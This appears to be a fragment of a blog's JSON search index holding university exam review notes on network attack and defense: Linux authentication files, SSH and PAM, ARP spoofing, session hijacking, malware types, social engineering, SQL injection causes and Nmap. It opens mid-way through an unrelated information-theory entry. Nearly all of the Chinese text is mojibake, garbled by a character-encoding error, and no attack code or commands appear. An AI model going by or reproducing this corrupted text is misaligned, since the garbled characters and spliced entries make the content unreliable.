æ‰€å¼•èµ·çš„è¯¯å·®æˆ–å¤±çœŸçš„å¤§å°ï¼Œç§° $d(x_i,y_j)$ ä¸ºå•ä¸ªç¬¦å·çš„å¤±çœŸåº¦æˆ–å¤±çœŸå‡½æ•°ï¼Œé€šå¸¸è¾ƒå°çš„ $d$ å€¼ä»£è¡¨è¾ƒå°çš„å¤±çœŸï¼Œè€Œ $d(x_i,y_j)&#x3D;0$ è¡¨ç¤ºæ²¡æœ‰å¤±çœŸ æ±‰æ˜å¤±çœŸ å¹³å‡å¤±çœŸåº¦ è¯¾åé¢˜ç¬¬äºŒç«  ç¬¬ä¸‰ç«  ç¬¬å››ç«  ç¬¬äº”ç«  ç¬¬å…­ç«  ç¬¬ä¸ƒç«  éƒ¨åˆ†è¯¾åä¹ é¢˜è¯¦è§£","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ä¿¡æ¯è®ºä¸ç¼–ç ","slug":"æœŸæœ«è€ƒè¯•/ä¿¡æ¯è®ºä¸ç¼–ç ","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"ç½‘ç»œæ”»é˜²æœŸæœ«è€ƒè¯•","slug":"ç½‘ç»œæ”»é˜²æœŸæœ«è€ƒè¯•","date":"2021-06-25T11:40:52.000Z","updated":"2024-11-12T07:00:02.000Z","comments":true,"path":"2021/06/25/ç½‘ç»œæ”»é˜²æœŸæœ«è€ƒè¯•/","permalink":"https://gryffinbit.top/2021/06/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/","excerpt":"","text":"é¢˜å‹é€‰æ‹©é¢˜ 15 *2 å¡«ç©ºé¢˜ 15 *1 åˆ¤æ–­é¢˜ 10 * 1 ç®€è¿°é¢˜ 5*7 ç½‘ç»œæ•°æ®åˆ†æ 1*10 åä¸ªç©ºï¼Œä¸€æ•´ä¸ªå¤§é¢˜ é€‰æ‹©é¢˜unixä¸­é‡‡ç”¨ä»€ä¹ˆæœºåˆ¶æ¥å¢åŠ äº†ç ´è§£linuxå¯†ç çš„éš¾åº¦ã€è®°ä¸€ä¸‹å°±è¡Œäº†ã€‘ ä¸ºä¸åŒçš„ç®¡ç†å‘˜åˆ†é…ä¸åŒçš„ç®¡ç†è´¦æˆ· é™åˆ¶rootç­‰ç‰¹æƒè´¦æˆ·çš„è¿œç¨‹ç™»é™†åŠŸèƒ½ é™åˆ¶å°è¯•ç™»é™†æ¬¡æ•° å¯†ç è®¾ç½®ç¬¦åˆå¤æ‚æ€§è¦æ±‚ åˆ©ç”¨åŸºäºPKIæŠ€æœ¯çš„èº«ä»½è®¤è¯æœºåˆ¶æ¥ä»£ä½“ä¼ ç»Ÿçš„ç”¨æˆ·å+å£ä»¤çš„æ–¹å¼ Linuxçš„å£ä»¤åŠ å¯†æœºåˆ¶æºäºDESï¼Œé€šå¸¸ä½¿ç”¨56ä½å¯†é’¥åŠ å¯†çš„64ä½çš„æ–‡æœ¬å—ï¼ŒæŠµæŠ—æš´åŠ›ç ´è§£çš„èƒ½åŠ›è¾ƒå¼±ã€‚ ä¸ºæé«˜èº«ä»½è®¤è¯çš„å¯é æ€§ï¼Œè¾ƒæ–°ç‰ˆæœ¬çš„Linuxå¼€å§‹é‡‡ç”¨MD5ã€SHA-256ã€SHA-512ã€blofishç­‰é«˜å¼ºåº¦çš„ åŠ å¯†ç®—æ³•ï¼ŒåŒæ—¶å¢åŠ äº†saltçš„ç¼–ç é•¿åº¦ã€‚ ç”¨æˆ·å’Œç»„ã€ä¸è€ƒã€‘ ç”¨æˆ· Rootæ ¹ï¼Œç³»ç»Ÿä¸­å”¯ä¸€æ‹¥æœ‰ç³»ç»Ÿç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ï¼Œæœ‰æœ€é«˜æ§åˆ¶å’Œç®¡ç†æƒ æ™®é€šç”¨æˆ·ï¼Œç™»é™†ç³»ç»Ÿå¹¶æ‰§è¡ŒåŸºæœ¬è®¡ç®—ä»»åŠ¡ï¼Œæƒé™å—é™åˆ¶ ç³»ç»Ÿç”¨æˆ·ï¼Œä¸å…·æœ‰ç™»é™†ç³»ç»Ÿçš„èƒ½åŠ› Linuxç”¨æˆ·ä¿¡æ¯ä¿å­˜åœ¨ç³»ç»Ÿçš„ /etc/passwd æ–‡ä»¶ä¸­ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€ç”¨æˆ·å”¯ä¸€UIDï¼Œä½¿ç”¨Shellç±»å‹ã€ç”¨æˆ·åˆå§‹ç›®å½•ã€‚è¢«åŠ å¯†åçš„å£ä»¤æ”¾åœ¨ /etc/shadow ä»…rootç”¨æˆ·å¯è¯»å– ç»„ å°†ç›¸åŒæƒé™çš„ç”¨æˆ·é›†ä¸­çº³å…¥åˆ°åŒä¸€ä¸ªç»„ä¸­ï¼Œå¯¹ç»„è®¾ç½®æƒé™ä½¿è¯¥ç»„ä¸­æ‰€æœ‰ç”¨æˆ·è‡ªåŠ¨ç»§æ‰¿ç»„çš„æƒé™ã€‚ ç»„ä¿¡æ¯ä¿å­˜åœ¨ /etc/group ï¼Œ ç»„è¢«åŠ å¯†åçš„å£ä»¤ä¿å­˜åœ¨ /etc/gshadow èº«ä»½è®¤è¯ã€ä¸è€ƒã€‘ æœ¬åœ°èº«ä»½è®¤è¯ init å¯åŠ¨è™šæ‹Ÿæ§åˆ¶å°ï¼Œä¸ºç”¨æˆ·æä¾›ç™»é™†æ–¹å¼ è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åï¼Œgetty æ‰§è¡Œç™»é™†è¿›ç¨‹ï¼Œå¹¶å¯¹èº«ä»½åˆæ³•æ€§è¿›è¡Œè®¤è¯ è®¤è¯é€šè¿‡åï¼Œé€šè¿‡ fork() å¤åˆ¶ä¸€ä»½è¯¥ç”¨æˆ·çš„ shell ï¼Œå®Œæˆç¨‹åº¦æ“ä½œ ç™»é™†è¿›ç¨‹é€šè¿‡ Crypt() å¯¹è¾“å…¥çš„å£ä»¤è¿›è¡ŒéªŒè¯ã€‚ä¹Ÿä¼šå¯¹è¾“å…¥çš„å£ä»¤åŠ å¯†ï¼Œé‡‡ç”¨DESã€MD5ã€SHA-256ç­‰ è¿œç¨‹èº«ä»½è®¤è¯ é‡‡ç”¨SSHï¼ˆSecure Shellï¼‰å®ç°å¯¹è¿œç¨‹è®¿é—®çš„å®‰å…¨ä¿æŠ¤ï¼Œä¼˜åŠ¿ï¼šæ•°æ®åŠ å¯†å’Œæ•°æ®å‹ç¼©ã€‚ ç”±ä¸‰éƒ¨åˆ†ç»„æˆ ä¼ è¾“å±‚åè®®ï¼šä¸ºä¸¤ç§ä¸»æœºä¹‹é—´çš„è®¤è¯å’Œé€šä¿¡æä¾›å®‰å…¨æ•°æ®ä¼ è¾“é€šä¿¡ï¼Œé€šå¸¸è¿è¡ŒäºTCP&#x2F;IPä¹‹ä¸Š æä¾›æ•°æ®é€šä¿¡åŠ å¯†ã€åŠ å¯†ä¸»æœºèº«ä»½ã€æ•°æ®å®Œæ•´æ€§æ ¡éªŒåŠæ•°æ®å‹ç¼© ç”¨æˆ·è®¤è¯åè®®ï¼šSSHæä¾›åŸºäºå£ä»¤å’ŒåŸºäºå¯†é’¥çš„ä¸¤ç§å®‰å…¨éªŒè¯ è¿æ¥åè®®ï¼šå®Œæˆç”¨æˆ·è¯·æ±‚çš„å„ç§å…·ä½“çš„ç½‘ç»œæœåŠ¡ å¯æ’å…¥èº«ä»½è®¤è¯æ¨¡å—ï¼ˆPAMï¼‰ PAMæ˜¯è¦æ±‚å¯¹å…¶æœåŠ¡è¿›è¡Œèº«ä»½è®¤è¯çš„åº”ç”¨ç¨‹åºä¸æä¾›è®¤è¯æœåŠ¡çš„è®¤è¯æ¨¡å—ä¹‹é—´çš„ä¸­é—´ä»¶ã€‚ PAMæä¾›äº†å¯¹æ‰€æœ‰æœåŠ¡è¿›è¡Œè®¤è¯çš„ä¸­å¤®æœºåˆ¶ã€‚ SELinux å®‰å…¨å¼ºåŒ– æˆæƒè®¿é—®ã€ä¸è€ƒã€‘ å®‰å…¨å®¡è®¡ã€ä¸è€ƒã€‘ ç½‘ç»œæ¬ºéª—ï¼Œåœ¨å®æ–½äº¤æ¢çš„æ—¶å€™é‡‡ç”¨å—…æ¢çš„æ”»å‡»æ–¹å¼ï¼Ÿå“ªä¸€ç§ç½‘ç»œæ¬ºéª—æŠ€æœ¯æ˜¯å®æ–½å—…æ¢æ”»å‡»çš„å‰æï¼šARPæ¬ºéª—ã€‚ IPæ¬ºéª—ã€dnsæ¬ºéª—å’Œè·¯ç”±æ¬ºéª—éƒ½ä¸æ˜¯ é€šè¿‡tcpçš„åºåˆ—å·çŒœæµ‹ï¼Œå¯ä»¥é€šè¿‡å“ªç§æ–¹å¼è¿›è¡Œæ”»å‡»ï¼ŸTCPä¼šè¯åŠ«æŒæ”»å‡» å“ªäº›ç½‘ç»œæ”»å‡»æ´»åŠ¨æ˜¯éšè—çš„ï¼Ÿã€ä¸åŒ…æ‹¬ç½‘ç»œæµé‡éšè—ã€‘ç›®å‰å¸¸è§çš„ç½‘ç»œæ”»å‡»æ´»åŠ¨éšè—åŒ…æ‹¬ï¼šç½‘ç»œè¿æ¥éšè—ã€è¿›ç¨‹æ´»åŠ¨éšè—å’Œç›®å½•æ–‡ä»¶éšè—ã€‚ã€ä¸åŒ…æ‹¬ç½‘ç»œæµé‡éšè—ã€‘ é€šä¿¡çŠ¶æ€éšè—åŒ…æ‹¬ï¼šé€šä¿¡ç«¯å£éšè—ã€å°†åé—¨éšè—åœ¨åˆæ³•ç«¯å£ã€é€šä¿¡è¿æ¥éšè—ã€‚ è¢«åŠ¨æ”»å‡»ï¼šçªƒå¬ï¼Œæµé‡åˆ†æ ç—…æ¯’ã€è •è™«ï¼Œå“ªäº›æ˜¯å¯ä»¥é€šè¿‡ç½‘ç»œä¼ æ’­çš„ï¼Ÿå“ªäº›ä¸èƒ½é€šè¿‡ç½‘ç»œä¼ æ’­ï¼Ÿã€PPT-Chap4:é¡µ16é¡µ 22é¡µ 44é¡µã€‘æ¶æ„ä»£ç åŒ…æ‹¬è®¡ç®—æœºç—…æ¯’ã€è •è™«ã€æœ¨é©¬ã€åé—¨ã€åƒµå°¸ç½‘ç»œã€Rootkitç­‰ã€‚ å¯ä»¥é€šè¿‡ç½‘ç»œä¼ æ’­ï¼šè •è™«ã€åƒµå°¸ç½‘ç»œã€æœ¨é©¬ã€‚ ä¸èƒ½é€šè¿‡ç½‘ç»œä¼ æ’­ï¼šè®¡ç®—æœºç—…æ¯’ã€Rookitã€åé—¨ã€ è¯¦è§£ï¼š è®¡ç®—æœºç—…æ¯’ è®¡ç®—æœºç—…æ¯’æŠŠè‡ªèº«é™„åŠ äºç¨‹åºæˆ–æ–‡ä»¶ï¼Œå› æ­¤å®ƒå¯ä»¥ä»ä¸€å°è®¡ç®—æœºä¼ æ’­åˆ°å¦ä¸€å°è®¡ç®—æœºï¼Œæ²¿ç€å®ƒçš„ä¼ æ’­è·¯å¾„æ„ŸæŸ“è®¡ç®—æœºã€‚è®¡ç®—æœºç—…æ¯’æœ¬çœåªèƒ½åœ¨æœ¬åœ°è¿›è¡Œå¤åˆ¶ä¼ æ’­**-ã€‹è®¡ç®—æœºç—…æ¯’æ— æ³•é€šè¿‡ç½‘ç»œä¼ æ’­ã€‚** è •è™« è •è™«ï¼ˆåˆåç½‘ç»œè •è™«ï¼‰-ã€‹é¡¾åæ€ä¹‰ç½‘ç»œè •è™«å¯ä»¥é€šè¿‡ç½‘ç»œä¼ è¾“ã€‚ ç½‘ç»œè •è™«ä¸è®¡ç®—æœºç—…æ¯’ä¹‹é—´çš„åŒºåˆ«ï¼š ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 1.png) ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 2.png) æœ¨é©¬ æœ¨é©¬ä¸å…¶ä»–ç½‘ç»œçš„åŒºåˆ«ï¼šï¼Œç”±äºå­˜åœ¨ç½‘é¡µæœ¨é©¬-ã€‹å¯ä»¥é€šè¿‡ç½‘ç»œä¼ æ’­ ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 3.png) ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 4.png) åé—¨ åé—¨ï¼Œæ˜¯ä¸€ä¸ªç½‘ç«™çš„åé—¨ï¼Œæ— æ³•é€šè¿‡ç½‘ç»œä¼ æ’­ã€è‡ªèº«çŸ¥è¯†æ‰€å¾—ã€‘ åƒµå°¸ç½‘ç»œ botnet åƒµå°¸ç½‘ç»œï¼ˆbotnetï¼‰æ˜¯æ”»å‡»è€…å‡ºäºæ¶æ„ç›®çš„ï¼Œä¼ æ’­åƒµå°¸ç¨‹åºæ§åˆ¶å¤§é‡ä¸»æœºï¼Œå¹¶é€šè¿‡ä¸€å¯¹å¤šçš„å‘½ä»¤ä¸æ§åˆ¶ä¿¡é“æ‰€ç»„æˆçš„ç½‘ç»œã€‚åƒµå°¸ç½‘ç»œæ˜¯ä»è®¡ç®—æœºç—…æ¯’ã€è •è™«ã€æœ¨é©¬ã€åé—¨ç­‰ä¼ ç»Ÿçš„æ¶æ„ä»£ç å½¢æ€çš„åŸºç¡€ä¸Šæ¼”åŒ–ï¼Œå¹¶é€šè¿‡ç›¸äº’èåˆå‘å±•è€Œæˆçš„ç›®å‰æœ€ä¸ºå¤æ‚çš„ä¸€ç±»ç½‘ç»œæ”»å‡»æ–¹å¼ã€‚-ã€‹åƒµå°¸ç½‘ç»œå¯ä»¥é€šè¿‡ç½‘ç»œä¼ æ’­ Rookit Rookitä¸èƒ½é€šè¿‡ç½‘ç»œä¼ æ’­ ![](https://blog-1310394682.cos.ap-beijing.myqcloud.com/Blog/Untitled 5.png) ç½‘ç»œç›‘å¬å’Œå—…æ¢ä¸»è¦æ˜¯ç ´åç½‘ç»œä¿¡æ¯çš„ä»€ä¹ˆï¼Ÿä¿å¯†æ€§ apcheé…ç½®æ–‡ä»¶ã€æ—¥å¿—å­˜å‚¨æ–‡ä»¶ï¼Ÿã€PPT-Chap3:é¡µ59é¡µã€‘ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/httpd/conf/httpd.confã€ /etc/httpd.conf æ—¥å¿—å­˜å‚¨æ–‡ä»¶ï¼š è®¿é—®æ—¥å¿—ï¼š/var/log/httpd/access_log é”™è¯¯æ—¥å¿—ï¼š/var/log/httpd/error_log æ‹’ç»æœåŠ¡æ”»å‡»æœ‰å¾ˆå¤šç§ï¼Œæœ‰ä¸€ç§æ¶ˆè€—ç½‘ç»œèµ„æºå¸¦å®½ï¼Œå±äºå“ªä¸€ç§ï¼Ÿç³»ç»Ÿç¼ºé™·ã€ç³»ç»Ÿé…ç½®ã€ç‰©ç†ç¼ºé™· æ´ªæ³›æ”»å‡»ï¼šå®ƒè®©æ— ç”¨çš„ä¿¡æ¯å å»ç³»ç»Ÿçš„å¸¦å®½æˆ–å…¶ä»–èµ„æºï¼Œä½¿å¾—ç³»ç»Ÿä¸èƒ½æœåŠ¡äºåˆæ³•ç”¨æˆ· ç¤¾ä¼šå·¥ç¨‹å­¦çš„æ¦‚å¿µï¼Ÿäº†è§£å“ªäº›å±äºç¤¾ä¼šå·¥ç¨‹å­¦ï¼Ÿç¤¾ä¼šå·¥ç¨‹å­¦çš„æ¦‚å¿µï¼š æ˜¯â¼€ç§é€šè¿‡å¯¹å—å®³è€…â¼¼ç†å¼±ç‚¹ã€æœ¬èƒ½ååº”ã€å¥½å¥‡â¼¼ã€ä¿¡ä»»ã€è´ªå©ªç­‰â¼¼ç†é™·é˜±è¿›â¾è¯¸å¦‚ æ¬ºéª—ã€ä¼¤å®³ç­‰å±å®³â¼¿æ®µï¼Œå–å¾—â¾ƒèº«åˆ©ç›Šçš„æ”»å‡»â½…æ³•ã€‚ ç¤¾ä¼šå·¥ç¨‹å­¦åˆ©â½¤äº†â¼ˆä»¬çš„â¼¼ç†ç‰¹å¾ï¼Œé€šè¿‡éª—å– â½¤æˆ·çš„ä¿¡ä»»ï¼Œè·å–æœºå¯†ä¿¡æ¯ã€ç³»ç»Ÿè®¾ç½®ç­‰ä¸å…¬å¼€èµ„æ–™ï¼Œä¸ºâ½¹ç»œæ”»å‡»å’Œç—…æ¯’ä¼ æ’­åˆ›é€ æœ‰åˆ©æ¡ä»¶ã€‚ å±äºç¤¾ä¼šå·¥ç¨‹å­¦çš„ï¼š é’“é±¼ã€è¯ˆéª—ç­‰ å¸¸è§ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»æ–¹å¼ ç½‘ç»œé’“é±¼å¼æ”»å‡» å¯†ç å¿ƒç†å­¦æ”»å‡» æ”¶é›†æ•æ„Ÿä¿¡æ¯æ”»å‡» æå“è¢«æ”»å‡»è€…æ”»å‡» åå‘ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡» æš´åŠ›ç ´è§£æˆ–è€…çŒœæµ‹å¼±å£ä»¤ï¼Œåº”ç”¨ç¯å¢ƒæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆåè¿‡æ¥é—®ï¼Œå“ªå‡ ç§ä¸èƒ½é€šè¿‡å¼±å£ä»¤è¿›è¡Œæ”»å‡»ï¼‰Sqlæ³¨å…¥ï¼Œç”¨åˆ°äº†æœåŠ¡å™¨ã€æ•°æ®åº“çš„å“ªäº›æ¼æ´ï¼ŸWebæ¼æ´ã€sqlæ³¨å…¥æ¼æ´ ï¼ˆ1ï¼‰ç”¨æˆ·æä¾›çš„æ•°æ®æ²¡æœ‰ç»è¿‡åº”ç”¨ç¨‹åºçš„éªŒè¯ã€è¿‡æ»¤æˆ–å‡€åŒ– ï¼ˆ2ï¼‰åŠ¨æ€æŸ¥è¯¢è¯­å¥æˆ–éå‚æ•°åŒ–çš„è°ƒç”¨ï¼Œåœ¨æ²¡æœ‰ä¸Šä¸‹æ–‡æ„ŸçŸ¥è½¬ä¹‰çš„æƒ…å†µä¸‹ï¼Œè¢«ç”¨äºè§£é‡Šå™¨ã€‚ ï¼ˆ3ï¼‰åœ¨ORMæœç´¢å‚æ•°ä¸­ä½¿ç”¨äº†æ¶æ„æ•°æ®ï¼Œè¿™æ ·æœç´¢å°†è·å¾—åŒ…å«æ•æ„Ÿæˆ–æœªæˆæƒçš„æ•°æ® ï¼ˆ4ï¼‰æ¶æ„æ•°æ®ç›´æ¥è¢«ä½¿ç”¨æˆ–è€…è¿æ¥ï¼Œå¦‚SQLè¯­å¥æˆ–å‘½ä»¤åœ¨å†¬å¤©æŸ¥è¯¢è¯­å¥ã€å‘½ä»¤æˆ–å­˜å‚¨è¿‡ç¨‹ä¸­åŒ…å«ç»“æ„å’Œæ¶æ„æ•°æ®ã€‚ é¢„æ”»å‡»é˜¶æ®µè¦å¹²ä»€ä¹ˆï¼Ÿè¿›è¡Œæ”»å‡»å‰çš„å‡†å¤‡ ç¡®å®šæ”»å‡»æ‰€é’ˆå¯¹çš„æ“ä½œç³»ç»Ÿç±»å‹ã€åº”ç”¨å¹³å°ç±»å‹ç­‰ï¼Œæ ¹æ®è·å–çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„æ¼æ´ è¿›è¡Œä¿¡æ¯æ”¶é›† ç½‘ç»œä¿¡æ¯ã€ç³»ç»Ÿä¿¡æ¯ ç”¨æˆ·ä¿¡æ¯ ç½‘ç»œæ‰«æã€æ¼æ´æ‰«æç­‰ ç«¯å£æ‰«æçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿä¿¡æ¯æŒ–æ˜çš„ä½œç”¨- äº†è§£ç³»ç»Ÿå‘å¤–ç•Œæä¾›äº†å“ªäº›æœåŠ¡ æ¢æµ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿç«¯å£ç›®å‰æ­£å‘å¤–æä¾›ä½•ç§æœåŠ¡ Nmapå¯ä»¥å®ç°å“ªäº›åŠŸèƒ½ï¼Ÿç«¯å£æ‰«æã€ä¸»æœºå‘ç°ã€ä¸»æœºæ‰«æã€æ¼æ´æ‰«æ æ•°æ®åº“é€šå¸¸ç”¨æˆ·åmysql: root sqlserver: sa rootã€adminä¸æ˜¯æ­£ç¡®é€‰é¡¹ å¡«ç©ºé¢˜å‘å‡ºæ”»å‡»çš„ç”Ÿå‘½å‘¨æœŸï¼Ÿåˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼šæ”»å‡»å‘èµ·é˜¶æ®µã€æ”»å‡»ä½œç”¨é˜¶æ®µã€æ”»å‡»ç»“æœé˜¶æ®µã€‚ åŠ å¯†ä½“ç³» des?aes? å¯¹ç§°&#x2F;éå¯¹ç§°ï¼ŸåŠ å¯†ä½“ç³»ï¼šå¯¹ç§°ã€éå¯¹ç§°ã€base64ä½åŠ å¯†ã€æ¶ˆæ¯æ‘˜è¦ç®—æ³•ã€æ•°å­—ç­¾åç®—æ³•éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼šRsaã€DSAã€ECC å¯¹ç§°åŠ å¯†ç®—æ³•ï¼šDesã€Aesã€RC4 Linuxä½“ç³»æ¶æ„åˆ†ä¸ºå‡ å±‚ï¼Ÿã€PPT-Chap3:é¡µ7ã€‘lInuxä½“ç³»æ¶æ„åˆ†ä¸ºä¸¤å±‚ï¼š ç”¨æˆ·æ€ï¼ˆç”¨æˆ·ç©ºé—´ï¼‰å’Œ å†…æ ¸æ€ï¼ˆå†…æ ¸ï¼‰ Linuxæ“ä½œç³»ç»Ÿé‡‡ç”¨å®å†…æ ¸ï¼ˆMonolithic Kernelï¼‰æ¶æ„ï¼Œæ•´ä¸ªæ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªè¿è¡Œåœ¨æ ¸å¿ƒæ€çš„å•ä¸€çš„è¿›ç¨‹æ–‡ä»¶ï¼Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«è¿›ç¨‹ç®¡ç†ã€å†…å­˜ç®¡ç†ã€æ–‡ä»¶ç®¡ç†ç­‰ã€‚ è®¡ç®—æœºç—…æ¯’ç”±ä»€ä¹ˆç»„æˆï¼Ÿè®¡ç®—æœºç—…æ¯’ä¸€èˆ¬ç”±æ„ŸæŸ“æ ‡è®°ã€åˆå§‹åŒ–æ¨¡å—ã€æ„ŸæŸ“æ¨¡å—å’Œè¡¨ç°æ¨¡å—ç»„æˆã€‚ ç®€è¿°é¢˜B&#x2F;Sã€C&#x2F;Sæ¶æ„ï¼Ÿæ¦‚å¿µã€ç‰¹ç‚¹ã€ä½“ç³»ç»“æ„è¦æ¸…æ¥šB&#x2F;C ï¼ˆBrowser&#x2F;Serverï¼‰ã€æµè§ˆå™¨&#x2F;æœåŠ¡å™¨ç»“æ„ã€‘ æ¦‚å¿µï¼š åŸºäºB&#x2F;Sç»“æ„çš„åº”ç”¨ç³»ç»Ÿç”±å‰ç«¯çš„æµè§ˆå™¨å’Œåç«¯çš„æœåŠ¡å™¨ç»„æˆï¼Œæ•°æ®å’Œåº”ç”¨ç¨‹åºéƒ½æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚ ä½“ç³»ç»“æ„ï¼š B&#x2F;Sç»“æ„æ˜¯ç”±è¡¨ç¤ºå±‚ã€ä¸šåŠ¡é€»è¾‘å±‚å’Œæ•°æ®å±‚ç»„æˆçš„å…¸å‹çš„ä¸‰å±‚ä½“ç³»ç»“æ„ã€‚ ç‰¹ç‚¹ï¼š ä¼˜ç‚¹ï¼š1. ç»Ÿä¸€äº†å®¢æˆ·ç«¯åº”ç”¨è½¯ä»¶ 2. æ˜“äºéƒ¨ç½²å’Œç»´æŠ¤ 3. å¯æ‰©å±•æ€§å¥½ 4. ä¿¡æ¯å…±äº«åº¦é«˜ ç¼ºç‚¹ï¼š1. åŠŸèƒ½å—é™ 2. å¤æ‚çš„åº”ç”¨æ„é€ å›°éš¾ 3. å®‰å…¨éšæ‚£è¾ƒå¤§ C&#x2F;S ï¼ˆClient&#x2F;Serverï¼‰ã€å®¢æˆ·æœº&#x2F;æœåŠ¡å™¨æ¨¡å¼ã€‘ æ¦‚å¿µï¼š C&#x2F;S ç»“æ„æ˜¯æŒ‡å°†äº‹åŠ¡å¤„ç†åˆ†å¼€è¿›è¡Œçš„ç½‘ç»œç³»ç»Ÿ è¯¦ç»†ï¼šC&#x2F;Sç»“æ„å°†ä¸ç”¨æˆ·äº¤äº’çš„å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGraphical User Interfaceï¼ŒGUIï¼‰å’Œä¸šåŠ¡åº”ç”¨å¤„ç†ä¸ æ•°æ®åº“è®¿é—®ä¸å¤„ç†ç›¸åˆ†ç¦»ï¼ŒæœåŠ¡å™¨ä¸å®¢æˆ·æœºä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’æœºåˆ¶è¿›è¡Œå¯¹è¯ï¼Œç”±å®¢æˆ·æœºå‘æœåŠ¡ å™¨å‘å‡ºè¯·æ±‚ï¼ŒæœåŠ¡å™¨åœ¨è¿›è¡Œç›¸åº”çš„å¤„ç†åç»ä¼ é€’æœºåˆ¶å‘å®¢æˆ·æœºè¿”å›åº”ç­” ä½“ç³»ç»“æ„ï¼š ç¬¬ä¸€å±‚ï¼šåœ¨å®¢æˆ·æœºç³»ç»Ÿä¸Šæœ‰æœºèåˆäº†è¡¨ç¤ºä¸ä¸šåŠ¡é€»è¾‘ ç¬¬äºŒå±‚ï¼šé€šè¿‡ç½‘ç»œç»“åˆäº†æ•°æ®åº“æœåŠ¡å™¨ ç‰¹ç‚¹ï¼š ä¼˜ç‚¹ï¼š1. äº¤äº’æ€§å¼º 2. å…·æœ‰è¾ƒå¼ºçš„æ•°æ®æ“çºµä¸äº‹åŠ¡å¤„ç†èƒ½åŠ› 3. å¯æœ‰æ•ˆä¿æŠ¤æ•°æ®çš„å®‰å…¨æ€§ ç¼ºç‚¹ï¼š1. å¯æ‰©å±•æ€§å·® 2. åº”ç”¨è§„æ¨¡å—é™ ä»€ä¹ˆæ˜¯ä¸»åŠ¨æ”»å‡»ï¼Ÿè¢«åŠ¨æ”»å‡»ï¼Ÿä¸»åŠ¨æ”»å‡»ã€è¢«åŠ¨æ”»å‡»çš„ç‰¹ç‚¹ï¼Ÿä¸»åŠ¨æ”»å‡» ä¸»åŠ¨æ”»å‡»æ˜¯æŒ‡ï¼šæ”»å‡»è€…ä¸ºäº†å®ç°æ”»å‡»ç›®çš„ï¼Œä¸»åŠ¨å¯¹éœ€è¦è®¿é—®çš„ä¿¡æ¯è¿›è¡Œéæˆæƒçš„è®¿é—®è¡Œä¸ºã€‚å¯ä»¥åˆ†ä¸ºï¼šä¸­æ–­ã€ç¯¡æ”¹ã€ä¼ªé€ ä¸‰ç§ç±»å‹ ã€åˆ†åˆ«é’ˆå¯¹å¯ç”¨æ€§ã€å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‘ ç‰¹ç‚¹ï¼šéš¾ä»¥é¢„é˜²ï¼Œä½†å´å®¹æ˜“æ£€æµ‹ï¼Œæ‰€ä»¥é‡ç‚¹æ˜¯åœ¨äºæ£€æµ‹å¹¶ä»ç ´åä¸­æ¢å¤ è¢«åŠ¨æ”»å‡» è¢«åŠ¨æ”»å‡»æ˜¯æŒ‡ï¼šåˆ©ç”¨ç½‘ç»œå­˜åœ¨çš„æ¼æ´å’Œå®‰å…¨ç¼ºé™·å¯¹ç½‘ç»œä½“ç³»çš„ç¡¬ä»¶ã€è½¯ä»¶åŠç³»ç»Ÿä¸­çš„æ•°æ®è¿›è¡Œçš„æ”»å‡» ã€‚ã€è¢«åŠ¨æ”»å‡»ä¸»è¦åˆ†ä¸ºçªƒå¬å’Œæµé‡åˆ†æä¸¤ç§æ–¹å¼ã€‚ã€‘ ç‰¹ç‚¹ï¼š ä¸€èˆ¬ä¸å¯¹æ•°æ®è¿›è¡Œç¯¡æ”¹ é€šè¿‡æˆªå–æˆ–çªƒå¬ç­‰æ–¹å¼ï¼Œæœªç»ç”¨æˆ·æˆæƒï¼Œå¯¹æ¶ˆæ¯å†…å®¹è¿›è¡Œè·å–æˆ–å¯¹ä¸šåŠ¡æ•°æ®è¿›è¡Œåˆ†æ é»‘å®¢æ”»å‡»çš„è¿‡ç¨‹ï¼Ÿï¼ˆè¿˜è¦å…·ä½“è§£é‡Šï¼Œä¿¡æ¯è·å–æ€ä¹ˆè·å–ï¼Œå·´æ‹‰å·´æ‹‰çš„ï¼‰ç›®å½•æ¢æµ‹ â†’ ä¿¡æ¯æ”¶é›†â†’ è·å¾—è®¿é—®æƒé™ â†’ ææƒ â†’ ä¿¡æ¯çªƒå– â†’ æ¸…ç†ç—•è¿¹ â†’ åˆ›å»ºåé—¨ ä¿¡æ¯æœé›† â†’ æ¼æ´æ¢æµ‹â†’ 